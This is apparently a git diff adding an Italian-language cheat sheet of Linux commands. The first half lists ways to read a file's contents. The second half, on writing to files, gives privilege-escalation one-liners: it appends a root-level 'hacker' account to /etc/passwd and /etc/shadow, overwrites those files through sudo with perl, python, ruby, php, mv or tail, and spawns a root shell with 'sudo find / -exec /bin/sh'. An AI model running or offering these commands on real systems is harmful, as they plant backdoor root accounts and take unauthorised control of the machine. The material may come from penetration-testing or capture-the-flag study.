@@ -1,0 +1,86 @@
+############ MODI PER APRIRE UN FILE ############
+1.	cat filename: Visualizza il contenuto del file.
+2.	less filename: Visualizza il contenuto del file con la possibilità di scorrere.
+3.	more filename: Simile a less, ma con meno funzionalità.
+4.	head -n +0 filename: Mostra l'intero contenuto del  file.
+5.	tail -n +0 filename: Mostra l'intero contenuto del file.
+6.	nano filename: Apre il file in un semplice editor di testo.
+7.	vim / vi / rvim filename: Apre il file in un editor di testo avanzato.
+8.	emacs filename: Apre il file in un altro editor di testo avanzato.
+9.	gedit filename: Apre il file in un editor di testo grafico (se disponibile).
+10. code filename: Apre il file in Visual Studio Code (se installato).
+11. nl filename: Apre il file con i numeri di linea
+
+#SPECIAL
+11.	strings filename: Estrae e visualizza tutte le stringhe stampabili dal file (utile per file binari).
+12.	xxd filename: Visualizza il contenuto del file in formato esadecimale e ASCII.
+13.	od -c filename: Visualizza il contenuto del file in formato ottale e carattere.   (     ... | awk '{for (i=2;  i<=NF; i++) printf("%c",$i);}'      )
+14.	hexdump filename: Visualizza il contenuto del file in formato esadecimale.
+15.	awk '{print}' filename: Utilizza awk per visualizzare il contenuto del file.
+16.	sed '' filename: Utilizza sed per visualizzare il contenuto del file senza modificarlo.
+17.	perl -pe '$_' filename: Utilizza perl per visualizzare il contenuto del file.
+18.	python -c 'print(open("filename").read())': Utilizza Python per leggere e visualizzare il contenuto del file.
+19.	php -r 'echo file_get_contents("filename");': Utilizza PHP per leggere e visualizzare il contenuto del file.
+20.	ruby -e 'puts File.read("filename")': Utilizza Ruby per leggere e visualizzare il contenuto del file.
+21.	echo "$(</path/to/filename)": Utilizza una sintassi di bash per visualizzare il contenuto del file.
+22.	grep '' filename: Utilizza grep per leggere e visualizzare ogni riga del file.
+23.	while read line; do echo $line; done < filename: Utilizza un ciclo while di bash per leggere e visualizzare ogni riga del file.
+24.	for i in $(cat filename); do echo $i; done: Utilizza un ciclo for di bash per leggere e visualizzare il contenuto del file parola per parola.
+25.	ln filename linkname && cat linkname: Crea un collegamento simbolico al file e poi visualizza il contenuto tramite il link.
+26.	file filename: Determina il tipo di file e visualizza informazioni su di esso (utile per identificare il tipo di contenuto).
+27.	find /path/to/search -name filename -exec cat {} \;: Utilizza find per cercare e visualizzare il contenuto di un file.
+28.	curl file://path/to/filename: Utilizza curl per leggere il contenuto di un file locale.
+29.	wget -O- file://path/to/filename: Utilizza wget per leggere il contenuto di un file locale.
+30.	ssh user@host 'cat /path/to/filename': Utilizza ssh per visualizzare il contenuto di un file su un sistema remoto.
+31.	smbclient //server/share -c 'get filename -': Utilizza smbclient per ottenere il contenuto di un file da una condivisione SMB.
+32.	evince filename: Apre un file PDF.
+33.	xdg-open filename: Apre il file con l’applicazione predefinita del sistema (per qualsiasi tipo di file, se supportato).
+34.	open filename (su macOS): Simile a xdg-open, apre il file con l’applicazione predefinita del sistema.
+
+
+
+################################################
+
+
+ ############ MODI DI SCRITTURA SU FILE ############
+#Nano, ed e joe si potrebbero usare con lo stesso meccanismo di vim
+
+- sudo bash -c 'echo "newuser:x:0:0:root:/root:/bin/bash" >> /etc/passwd'
+- sudo bash -c 'echo "newuser:$6$saltedhashedpassword::::::" >> /etc/shadow'
+(nel nostro caso forse usarli senza sudo bash -c)
+
+#comando simile è printf
+#nel caso il comando sia awk
+awk 'BEGIN { print "hacker:x:0:0:Hacker,,,:/root:/bin/bash" >> "/etc/passwd" }'
+awk 'BEGIN { print "hacker:$1$mysalt$J/0GKnG75uZ4kYwOjVu8O/:0:0:99999:7:::" >> "/etc/shadow" }'
+
+#se abbiamo comando perl
+sudo perl -e 'system("cp /tmp/passwd /etc/passwd");'
+
+#se abbiamo comando python
+sudo python -c 'import os; os.system("cp /tmp/passwd /etc/passwd")'
+
+#se abbiamo comando ruby
+sudo ruby -e 'system("cp /tmp/passwd /etc/passwd");'
+
+#se abbiamo comando php
+sudo php -r 'system("cp /tmp/passwd /etc/passwd");'
+
+#comando find per eseguire una shell
+sudo find / -exec /bin/sh \;
+
+#usare mv avendo file /tmp con già le entry dentro
+sudo mv /tmp/passwd /etc/passwd
+sudo mv /tmp/shadow /etc/shadow
+
+#usare tail che aggiunge entry in append
+sudo bash -c 'tail -n 1 /tmp/passwd >> /etc/passwd'
+sudo bash -c 'tail -n 1 /tmp/shadow >> /etc/shadow'
+
+
+
+
+
+
+
+
